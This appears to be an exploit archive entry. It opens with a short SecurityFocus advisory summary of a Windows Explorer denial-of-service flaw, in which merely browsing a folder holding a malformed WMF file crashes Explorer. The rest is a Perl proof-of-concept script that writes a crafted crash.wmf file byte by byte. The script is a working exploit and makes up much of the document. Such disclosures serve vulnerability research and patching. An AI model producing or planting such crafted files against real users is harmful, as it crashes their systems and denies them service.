source: http://www.securityfocus.com/bid/22715/info

Microsoft Windows Explorer is prone to a denial-of-service vulnerability.

A remote attacker may exploit this vulnerability by presenting a malicious file to a victim user. Users do not have to open the file -- simply browsing a folder containing the malicious file is sufficient to trigger this issue.

A successful exploit will crash the vulnerable application, effectively denying service.

This issue may be related to BID 19365 (Microsoft Windows GDI32.DLL WMF Remote Denial of Service Vulnerability) or BID 21992 (Microsoft Windows Explorer WMF File Denial of Service Vulnerability). 

#!/usr/bin/perl

print "\nWMF PoC denial of service exploit by AzM";
print "\n\ngenerating crash.wmf...";
open(WMF, ">./crash.wmf") or die "cannot create wmf file\n";
print WMF "\x01\x00\x09\x00\x00\x03\x22\x00\x00\x00\x01\x00\x84\x43\x00\x00";
print WMF "\x00\x00\x10\x00\x00\x00\x26\x06\x0A\x00\x16\x00\x90\x90\x90\x90";
print WMF "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
print WMF "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x00\x03\x00";
print WMF "\x00\x00\x00\x00";
close(WMF);
print "Ok\n"; 